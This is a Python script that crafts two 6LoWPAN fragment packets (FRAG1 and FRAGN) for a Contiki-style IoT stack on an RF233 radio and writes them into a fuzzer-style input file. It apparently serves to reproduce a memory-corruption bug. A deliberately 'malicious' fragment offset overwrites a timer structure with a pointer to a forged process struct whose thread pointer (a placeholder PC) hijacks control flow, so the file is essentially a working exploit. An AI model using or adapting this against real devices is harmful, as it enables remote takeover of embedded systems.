#!/usr/bin/env python3
from dataclasses import dataclass
from struct import pack, unpack
from binascii import hexlify, unhexlify
from sys import argv

SICSLOWPAN_DISPATCH_NALP = 0x00 
SICSLOWPAN_DISPATCH_IPV6 = 0x41 
SICSLOWPAN_DISPATCH_HC1 = 0x42 
SICSLOWPAN_DISPATCH_IPHC = 0x60 
SICSLOWPAN_DISPATCH_FRAG1 = 0xc0 
SICSLOWPAN_DISPATCH_FRAGN = 0xe0

if len(argv) != 3:
    print("Usage: {} <base_filename.input> <output_filename>".format(argv[0]))
    exit()

filename = argv[1]

marker = b'\xbe\xef\xfa\xce'

def u8(content):
    return unpack("<B", content)[0]

def p8(val):
    return pack(">B", val)

def p16(val):
    return pack(">H", val)

def u16(content):
    return unpack(">H", content)[0]

def p64(val):
    return pack(">Q", val)

def u64(content):
    return unpack(">Q", content)[0]


# 1. frag1
# rf233 packet with seq 121 == 0x79
frag1 = unhexlify(b'41c879cdabffff373231324c4d5441')
# 6lowpan
# frag1 type
frag_size = 1 & 0x7ff
frag1 += p16((0xc0<<8) | frag_size)
frag_tag = 1
frag1 += p16(frag_tag)
# dispatch_type == SICSLOWPAN_DISPATCH_IPV6
frag1 += p8(SICSLOWPAN_DISPATCH_IPV6)
# sics_buf 
frag1 += 40 * b"\x51"
# fragment itself
# this goes to 0x20002268

"""
struct process {
  struct process *next;
#if PROCESS_CONF_NO_PROCESS_NAMES
#define PROCESS_NAME_STRING(process) ""
#else
  const char *name;
#define PROCESS_NAME_STRING(process) (process)->name
#endif
  PT_THREAD((* thread)(struct pt *, process_event_t, process_data_t));
  struct pt pt;
  unsigned char state, needspoll;
};
"""
buf_start = 0x20002268
PC = 0x90909090
frag1 += pack("<I", 0)  # next
frag1 += pack("<I", 0)  # name
frag1 += pack("<I", PC)  # thread *
frag1 += pack("<H", 0xffff)  # pt.lc
frag1 += pack("<B", 0xff)  # state
frag1 += pack("<B", 0xff)  # needspoll
frag1 += 10 * b'\x76\x76\x76\x76'

sicslowpanbuf = 0x20002240
uip_ds6_timer_periodic = 0x200029D0

# 2. fragn
# rf233 packet with seq 123 == 0x7b
fragn = unhexlify(b'41c87bcdabffff373231324c4d5441')
# 6lowpan
# fragn type
frag_size = 30 & 0x7ff
fragn += p16((0xe0<<8) | frag_size)
frag_tag = 1
fragn += p16(frag_tag)
malicious_frag_offset = (uip_ds6_timer_periodic - sicslowpanbuf) // 8 #+ 1
benign_frag_offset = 80
frag_offset = malicious_frag_offset # benign_frag_offset
fragn += p8(frag_offset)
# fragn fragments do not carry a header
# fragment itself
fragn += 2 * pack("<I", 1)
fragn += 4 * b"\x00" # next == 0
fragn += pack("<I", buf_start) # 0x20002268) # struct process *p == 0x65656565
# fragn += 64*b'\x65'

payload = marker.join([frag1, fragn])

with open(argv[2], "wb") as f:
    with open(argv[1], "rb") as existing_input:
        existing = existing_input.read()
        existing_lines = existing.split(marker)
        f.write(payload+marker+marker.join(existing_lines[:3]))
